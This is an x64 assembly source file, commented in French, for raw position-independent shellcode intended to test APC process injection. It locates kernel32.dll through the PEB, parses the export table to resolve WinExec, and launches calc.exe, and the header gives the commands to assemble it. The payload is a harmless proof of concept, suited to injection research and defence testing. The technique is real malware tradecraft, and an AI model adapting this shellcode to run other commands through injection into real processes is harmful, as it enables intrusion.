# ============================================================
#  winexec_calc.s — Shellcode brut PIC x64 corrigé pour APC
#
#  Objectif : tester l'injection APC avec un shellcode PIC qui
#  résout correctement kernel32.dll via PEB puis appelle WinExec.
#
#  Assemblage :
#    x86_64-w64-mingw32-as --64 -o winexec_calc.o winexec_calc.s
#    x86_64-w64-mingw32-objcopy -O binary -j .text winexec_calc.o calc.x64.bin
# ============================================================
.intel_syntax noprefix
.text
.global _start

_start:
    push rbp
    mov  rbp, rsp
    and  rsp, -16
    sub  rsp, 0x20

    push rbx
    push rsi
    push rdi

    mov rax, qword ptr gs:[0x60]      # PEB
    mov rax, qword ptr [rax + 0x18]   # PEB->Ldr
    mov rax, qword ptr [rax + 0x20]   # InMemoryOrderModuleList head

    mov rax, qword ptr [rax]          # exe
    mov rax, qword ptr [rax]          # ntdll
    mov rax, qword ptr [rax]          # kernel32
    mov rbx, qword ptr [rax + 0x20]   # DllBase

    cmp word ptr [rbx], 0x5A4D        # MZ
    jne fail

    mov eax, dword ptr [rbx + 0x3C]   # e_lfanew
    lea r10, [rbx + rax]
    mov eax, dword ptr [r10 + 0x78]   # Export Directory RVA
    test eax, eax
    jz fail
    lea rsi, [rbx + rax]

    mov ecx, dword ptr [rsi + 0x18]   # NumberOfNames
    mov edx, dword ptr [rsi + 0x20]   # AddressOfNames
    lea rdi, [rbx + rdx]
    mov r8d, dword ptr [rsi + 0x24]   # AddressOfNameOrdinals
    lea r8, [rbx + r8]
    mov r9d, dword ptr [rsi + 0x1C]   # AddressOfFunctions
    lea r9, [rbx + r9]

    xor r11d, r11d

loop_names:
    mov eax, dword ptr [rdi + r11*4]
    lea rax, [rbx + rax]
    cmp dword ptr [rax], 0x456E6957   # "WinE"
    jne next_name
    cmp dword ptr [rax + 4], 0x00636578 # "xec\0"
    jne next_name

    movzx eax, word ptr [r8 + r11*2]
    mov eax, dword ptr [r9 + rax*4]
    lea rax, [rbx + rax]

    lea rcx, [rip + cmd_calc]
    mov edx, 1
    call rax

    jmp done

next_name:
    inc r11d
    dec ecx
    jnz loop_names

fail:
done:
    pop rdi
    pop rsi
    pop rbx
    mov rsp, rbp
    pop rbp
    ret

cmd_calc:
    .asciz "calc.exe"
